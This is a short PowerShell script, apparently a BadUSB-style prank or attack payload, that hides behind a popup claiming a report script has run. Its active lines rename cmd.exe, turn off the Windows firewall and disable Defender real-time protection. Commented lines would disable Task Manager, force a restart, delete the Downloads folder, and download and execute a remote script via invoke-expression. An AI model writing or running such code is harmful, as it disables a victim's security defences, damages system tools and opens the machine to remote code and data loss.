#4
$wshell = New-Object -ComObject Wscript.Shell
$wshell.Popup("The report generation script is executed!d")
#reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
Rename-Item "$env:SystemRoot\System32\cmd.exe" "cmd_disabled.exe"
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-MpPreference -DisableRealtimeMonitoring $true
#Restart-Computer -Force
#Remove-Item -Path "$env:USERPROFILE\Downloads\*" -Recurse -Force
#$pl = iwr "https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1"; invoke-expression $pl
exit










